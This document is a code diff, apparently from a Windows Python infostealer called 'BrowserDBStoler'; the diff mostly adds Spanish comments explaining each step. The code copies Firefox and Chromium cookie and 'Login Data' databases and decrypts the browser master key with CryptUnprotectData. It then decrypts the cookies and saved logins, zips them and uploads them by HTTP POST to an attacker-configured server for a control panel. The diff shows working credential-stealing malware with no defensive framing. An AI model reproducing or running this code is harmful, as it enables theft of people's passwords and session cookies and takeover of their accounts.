@@ -22,6 +22,7 @@ from time import gmtime, strftime
 from zipfile import ZipFile
 if not os.name == "nt":
 	sys.exit("This script only runs on Windows.")
+# SI LAS LIBRERIAS request Y pycryptodome NO ESTAN INSTALADAS, SE INSTALAN.
 try:
     import requests
 except ModuleNotFoundError:
@@ -39,15 +40,18 @@ except ModuleNotFoundError:
     except:
         sys.exit()
 
+# VARIABLES CONSTANTES, PARA USO POSTERIOR.
+# INCIAN DONDE ESTARA LA CARPETA TEMPORAL, EN DONDE SE COPIARAN LAS BASES DE DATOS Y SE DESCIFRARAN
 SERVER_HOST_POST = None
 TEMPORAL_DIRECTORY = str(f"{os.path.expanduser('~')}\\AppData\\Local\\Temp")
 TEMPORAL_WORKSPACE = str(f"{TEMPORAL_DIRECTORY}\\BrowserDBStoler")
 
+# PARA INDICAR EL SERVIDOR AL QUE ENVIARA LOS DATOS
 def SetServerHostPost(host):
     global SERVER_HOST_POST
     SERVER_HOST_POST = host
 
-
+# ENVIO DE UN ARCHIVO AL SERVIDOR, ESTOS SE REALIZA MEDIANTE UN POST A UN SITIO PHP
 def SendFile(filePath, BrowserName = None):
     try:
         with open(filePath, 'rb') as f:
@@ -73,6 +77,7 @@ def GetCurrentUserFolder():
 def GetFirefoxProfile():
     try:
         config = configparser.ConfigParser()
+        # LEE EL ARCHIVO PROFILES.INI PARA OBTENER LA RUTA EN DONDE SE ENCUENTRAN LOS DATOS DE ESE USUARIO
         config.read(str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\profiles.ini".format(GetCurrentUserFolder())))
         firefoxProfile = str(config['Profile0']['Path'].replace("/", "\\\\"))
         return firefoxProfile
@@ -85,8 +90,10 @@ def GetFirefoxCookies():
         firefoxProfile = GetFirefoxProfile()
         firefoxPath = str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\{}\\".format(GetCurrentUserFolder(), firefoxProfile))
         zipfilePath = str('{}.zip'.format(os.getlogin()))
+        # CREAMOS UNA INSTANCIA ZIPFILE Y COMPRIMIMOS EL ARCHIVO cookies.sqlite DE LA CARPETA DEL PERFIL
         with ZipFile(zipfilePath, 'w') as zip_object:
             zip_object.write(str('{}{}'.format(firefoxPath, "cookies.sqlite")))
+        # ENVIAMOS EL ZIP CREADO AL SERVIDOR
         SendFile(zipfilePath, "Firefox")
     except:
         print("Error: Firefox cookies not found.")
@@ -98,12 +105,14 @@ def GetFirefoxCookies():
 # START - Chromium based --------------------------------------------------
 def GetChromiumProfile(ChromiumPath, BrowserName):
     try:
+        # ABRIMOS EL ARCHIVO Local State QUE CONTIENE LOS PERFILES
         f = open(str("{}{}".format(ChromiumPath, "Local State")))
         data = json.load(f)
         retorno = []
         for i in data['profile']['info_cache']:
             retorno.append(i)
         f.close()
+        # DEVOLVEMOS LA LISTA DE PERFILES DISPONIBLES
         return retorno
     except:
         print("Error: Chromium '{}' profile not found.".format(BrowserName))
@@ -111,12 +120,16 @@ def GetChromiumProfile(ChromiumPath, BrowserName):
 
 def CreateTempDirectory(BrowserName):
     try:
+        # PARA LIMPIAR ALGUNA INSTANCIA ANTERIOR
         if os.path.exists(TEMPORAL_WORKSPACE):
             shutil.rmtree(TEMPORAL_WORKSPACE)
+        # PARA LIMPIAR LA CARPETA TEMPORAL DE TRABAJO, PARA EVITAR COPIAS ANTERIORES
         if os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
             shutil.rmtree(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
+        # CREAMOS LA CARPETA TEMPORAL SI ESTA NO EXISTE
         if not os.path.exists(TEMPORAL_WORKSPACE):
             os.mkdir(TEMPORAL_WORKSPACE)
+        # CREAMOS LA CARPETA TEMPORAL PARA EN NAVEGADOR
         if not os.path.exists(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")):
             os.mkdir(str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}"))
         return str(f"{TEMPORAL_WORKSPACE}\\{BrowserName}")
@@ -126,14 +139,18 @@ def CopyBrowserDataToTemp(ChromiumPath, BrowserName):
     try:
         tempDirectory = CreateTempDirectory(BrowserName)
         ChromiumProfiles = GetChromiumProfile(ChromiumPath, BrowserName)
+        # COPIAMOS EL ARCHIVO Local State A NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
         shutil.copyfile(str('{}{}'.format(ChromiumPath, "Local State")), str(f"{tempDirectory}\\Local State"))
+        # POR CADA PERFIL EXISTENTE:
         for profile in ChromiumProfiles:
+            # DEFINIMOS EL DIRECTORIO TEMPORAL PARA EL PERFIL
             profileTempPath = str(f"{tempDirectory}\\{profile}")
+            # OBTENEMOS EL DIRECTORIO DEL PERFIL
             ChromiumProfilePath = str("{}{}\\".format(ChromiumPath, profile))
-            # crea la carpeta del perfil
+            # CREA LA CARPETA DEL PERFIL EN NUESTRO DIRECTORIO DE TRABAJO TEMPORAL
             if not os.path.exists(str(f"{profileTempPath}")):
                 os.mkdir(str(f"{profileTempPath}"))
-            # copia las carpetas a la carpeta temporal
+            # COPIA Login Data y Cookies EN EL DIRECTORIO TEMPORAL
             shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "Login Data")), str(f"{profileTempPath}\\Login Data"))
             shutil.copyfile(str('{}{}'.format(ChromiumProfilePath, "\\Network\\Cookies")), str(f"{profileTempPath}\\Cookies"))
         return [tempDirectory+"\\", ChromiumProfiles]
@@ -144,13 +161,17 @@ def ObtenerLlaveDeCifrado(ChromiumPath):
     jsonContent = None
     localstatePath = os.path.join(ChromiumPath, "Local State")
     try:
+        # LEEMOS EL ARCHIVO Local State Y LO CONVERTIMOS A JSON
         with open(localstatePath, 'r') as file:
             jsonContent = json.loads(file.read())
     except:
         return None
     try:
+        # OBTENEMOS LA LLAVE DE CIFRADO.
         encryption_key = base64.b64decode(jsonContent['os_crypt']['encrypted_key'])[5:]
         encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
+        # ATENCION!
+        # SOLO EL EQUIPO DE ORIGEN PUEDE DESCIFRAR CORRECTAMENTE LA LLAVE DE CIFRADO
     except:
         encryption_key = None
     return encryption_key
@@ -171,26 +192,39 @@ def DescifrarCookies(ChromiumPath):
         encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
         cookiesFiles = []
         print("Descifrando cookies...")
+        # BUSCA EL ARCHIVO Cookies DENTRO DE LA CARPETA TEMPORAL
         for root, dir, files in os.walk(ChromiumPath):
             if "Cookies" in files:
                 cookiesFiles.append(os.path.join(root, "Cookies"))
+        # POR CADA ARCHIVO Cookies EN EL DIRECTORIO TEMPORAL:
         for cookie in cookiesFiles:
+            # CREA UNA CONEXION PARA CONECTARSE A LA BASE DE DATOS
             conn = sqlite3.connect(cookie)
+            # TRABAJAMOS EN BYTES, PARA LOS VALORES ENCRIPTADOS
             conn.text_factory = bytes
+            # CREAMOS UN CURSOR PARA NAVEGAR
             cursor = conn.cursor()
+            # CREAMOS UNA TABLA cocked PARA ALMACENAR LOS VALORES QUE DESCIFREMOS
             cursor.execute("CREATE TABLE IF NOT EXISTS cocked (host_key TEXT, name TEXT, decrypted_value TEXT)")
+            # SELECCIONA COLUMNAS DE LA TABLA cookies
             cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
+            # POR CADA FILA DEVUELTA:
             for host_key, name, value, encrypted_value in cursor.fetchall():
+                # OBTENEMOS EL DOMINIO DE LA COOKIE
                 host_key = host_key.decode('utf-8')
+                # OBTENEMOS EL NOMBRE DE LA COOKIE
                 name = name.decode('utf-8')
+                # DESCIFRAMOS EL VALOR DE LA COOKIE
                 value = DesencriptarValor(encrypted_value, encryption_key)
+                # GUARDAMOS EL VALOR DE LA COOKIE DESCIFRADA EN cooked.
                 cursor.execute("INSERT INTO cocked VALUES (?, ?, ?);", (host_key, name, value))
-            conn.commit()
-            conn.close()
+            conn.commit() # APLICAMOS CAMBIOS
+            conn.close() # SERRAMOS ESA CONEXION
         print("Cookies descifradas!")
     except Exception as ex:
         print("Error: '{}'.".format(ex))
 def DescifrarSigning(ChromiumPath):
+    # ESTO ES LO MISMO QUE EN DescrifrarCookies.
     try:
         encryption_key = ObtenerLlaveDeCifrado(ChromiumPath)
         signinFiles = []
@@ -215,6 +249,10 @@ def DescifrarSigning(ChromiumPath):
         print("Error: '{}'.".format(ex))
 def CrearArchivoEstructura(ChromiumPath, BrowserName, ChromiumInstallPath):
     try:
+        # EL ARCHIVO DE ESTRUCTURA ES MAS PARA EL PANEL DE CONTROL.
+        # REALMENTE, NO ES NECESARIO, PERO EN UN FUTURO TENGO PLANEADA UNA UPDATE PARA EL PANEL.
+        # POR AHORA, LO METEMOS
+        # INFORMACION IMPORTANTE SOBRE LA INSTANCIA
         datos = {
             "UserName": os.getlogin(),
             "ScriptDirectory": os.path.dirname(os.path.realpath(__file__)),
@@ -226,6 +264,7 @@ def CrearArchivoEstructura(ChromiumPath, BrowserName, ChromiumInstallPath):
                 "InstallDirectory": ChromiumInstallPath
             }
         }
+        # GUARDA LOS DATOS EN UN JSON
         with open(TEMPORAL_WORKSPACE+'\\structure.json', 'w', encoding='utf-8') as f:
             json.dump(datos, f, ensure_ascii=False, indent=4)
     except Exception as ex:
@@ -233,13 +272,21 @@ def CrearArchivoEstructura(ChromiumPath, BrowserName, ChromiumInstallPath):
 
 def GetChromiumCookies(AppData_Path, BrowserName):
     try:
+        # DEFINIMOS LA CARPETA DONDE ESTAN LOS DATOS DEL USUARIO
         ChromiumPath = str("{}\\AppData\\{}\\{}\\User Data\\".format(GetCurrentUserFolder(), AppData_Path, BrowserName))
+        # CREAMOS EL DIRECTORIO TEMPORAL
         copiedInfo = CopyBrowserDataToTemp(ChromiumPath, BrowserName)
+        # DESCIFRAMOS LAS COOKIES
         DescifrarCookies(copiedInfo[0])
+        # DESCIFRAMOS LOS INICIOS DE SESION GUARDADOS DEL AUTO-COMPLETADO
         DescifrarSigning(copiedInfo[0])
+        # CREAMOS EL ARCHIVO DE ESTRUCTURA PARA EL PANEL
         CrearArchivoEstructura(copiedInfo[0], BrowserName, ChromiumPath)
+        # DEFINIMOS EL ZIP CON LAS COOKIES A ENVIAR
         zipfilePath = str('{}\\{}-{}'.format(TEMPORAL_DIRECTORY, os.getlogin(), BrowserName))
+        # CREAMOS EL ZIP
         shutil.make_archive(zipfilePath, 'zip', TEMPORAL_WORKSPACE)
+        # ENVIAMOS EL ZIP AL SERVIDOR
         SendFile(zipfilePath+".zip", BrowserName)
     except:
         print("Error: Chromium '{}' cookies not found.".format(BrowserName))
